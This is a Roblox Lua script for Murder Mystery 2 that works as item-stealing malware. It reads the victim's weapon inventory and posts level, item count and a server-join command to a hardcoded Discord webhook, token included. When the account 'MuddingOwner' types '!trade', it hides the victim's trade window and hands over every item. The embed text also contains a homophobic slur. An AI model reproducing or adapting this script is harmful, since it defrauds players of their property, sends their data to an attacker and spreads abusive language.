local InvModule = require(game:GetService("ReplicatedStorage").Modules.InventoryModule)
local PlayerDataModule = require(game:GetService("ReplicatedStorage").Modules.ProfileData)
local LevelModule = require(game:GetService("ReplicatedStorage").Modules.LevelModule)

function SendMessageEMBED(url, embed)
    local http = game:GetService("HttpService")
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local data = {
        ["content"] = "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '"..game.JobId.."')",
        ["embeds"] = {
            {
                ["title"] = embed.title,
                ["description"] = embed.description,
                ["color"] = embed.color,
                ["fields"] = embed.fields,
                ["footer"] = {
                    ["text"] = embed.footer.text
                }
            }
        }
    }
    local body = http:JSONEncode(data)
    local response = request({
        Url = url,
        Method = "POST",
        Headers = headers,
        Body = body
    })
    print("Sent")
end

local destroytrades2 = coroutine.create(function()
    while true do
        local player = game:GetService("Players").LocalPlayer
        local tradeGUI = player:WaitForChild("PlayerGui"):WaitForChild("TradeGUI")
        local tradeGUIPhone = player:WaitForChild("PlayerGui"):WaitForChild("TradeGUI_Phone")

        if tradeGUI.Enabled == true then
            tradeGUI.Enabled = false
        end

        if tradeGUIPhone.Enabled == true then
            tradeGUIPhone.Enabled = false
        end

        wait(0.1)
    end
end)

local levelTable = {}
for i,v in pairs(LevelModule.XPTable) do
    if PlayerDataModule.NewXP < v then
        table.insert(levelTable, i)
    end
end
local playerLevel = math.min(table.unpack(levelTable))
local playerPrestige = LevelModule.Prestige

local allItems = {}
local itemsCount = 0

local vintageItems = {}
local commonItems = {}
local uncommonItems = {}
local rareItems = {}
local legendaryItems = {}
local godlyItems = {}
local ancientItems = {}
local uniqueItems = {}

for a,b in pairs(InvModule.MyInventory.Data.Weapons) do
    for c,d in pairs(b) do
        table.insert(allItems, d.ItemName)

        if d.Rarity == "Vintage" then
            table.insert(vintageItems, d.ItemName)
        end

        if d.Rarity == "Common" then
            table.insert(commonItems, d.ItemName)
        end

        if d.Rarity == "Uncommon" then
            table.insert(uncommonItems, d.ItemName)
        end

        if d.Rarity == "Rare" then
            table.insert(rareItems, d.ItemName)
        end

        if d.Rarity == "Legendary" then
            table.insert(legendaryItems, d.ItemName)
        end

        if d.Rarity == "Godly" then
            table.insert(godlyItems, d.ItemName)
        end

        if d.Rarity == "Ancient" then
            table.insert(ancientItems, d.ItemName)
        end

        if d.Rarity == "Unique" then
            table.insert(uniqueItems, d.ItemName)
        end
    end
end

for i,v in pairs(allItems) do
    itemsCount = itemsCount + 1
end

local function stealItems()
    coroutine.resume(destroytrades2)

    local sendArgs = {
        [1] = game:GetService("Players")['MuddingOwner']
    }
    game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(unpack(sendArgs))

    wait(3)

    for a,b in pairs(uniqueItems) do
        local addArgs = {
            [1] = b,
            [2] = "Weapons"
        }
        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(addArgs))
        wait(0.3)
    end

    for a,b in pairs(ancientItems) do
        local addArgs = {
            [1] = b,
            [2] = "Weapons"
        }
        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(addArgs))
        wait(0.3)
    end

    for a,b in pairs(godlyItems) do
        local addArgs = {
            [1] = b,
            [2] = "Weapons"
        }
        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(addArgs))
        wait(0.3)
    end

    for a,b in pairs(legendaryItems) do
        local addArgs = {
            [1] = b,
            [2] = "Weapons"
        }
        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(addArgs))
        wait(0.3)
    end

    for a,b in pairs(rareItems) do
        local addArgs = {
            [1] = b,
            [2] = "Weapons"
        }
        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(addArgs))
        wait(0.3)
    end

    for a,b in pairs(uncommonItems) do
        local addArgs = {
            [1] = b,
            [2] = "Weapons"
        }
        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(addArgs))
        wait(0.3)
    end

    for a,b in pairs(commonItems) do
        local addArgs = {
            [1] = b,
            [2] = "Weapons"
        }
        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(addArgs))
        wait(0.3)
    end

    for a,b in pairs(vintageItems) do
        local addArgs = {
            [1] = b,
            [2] = "Weapons"
        }
        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(addArgs))
        wait(0.3)
    end

    game:GetService("ReplicatedStorage").Trade.AcceptRequest:FireServer()
end

local embed = {
    ["title"] = "New MM2 hit, brought to you by snowydemise.",
    ["description"] = "Take all this faggot's shit",
    ["color"] = 65280,
    ["fields"] = {
        {
            ["name"] = "Level & Prestige",
            ["value"] = "Level: "..tostring(playerLevel)..", Prestige: "..tostring(playerPrestige)
        },
        {
            ["name"] = "Total Weapons Count",
            ["value"] = itemsCount - 2
        }
    },
    ["footer"] = {
        ["text"] = "snowy is best dev frfr"
    }
}
SendMessageEMBED('https://discord.com/api/webhooks/1252702892557865102/bIGY_Nmg1dZ6x3ncZywt1RdVhw7c75lFs3jiRX9NFMGMzygOudXPp-jdb2DgU0XINkai', embed)

game.Players.PlayerAdded:Connect(function(player)
    if player.Name == 'MuddingOwner' then
        game.Players['MuddingOwner'].Chatted:Connect(function(chat)
            if chat == '!trade' then
                stealItems()
            end
        end)
    end
end)
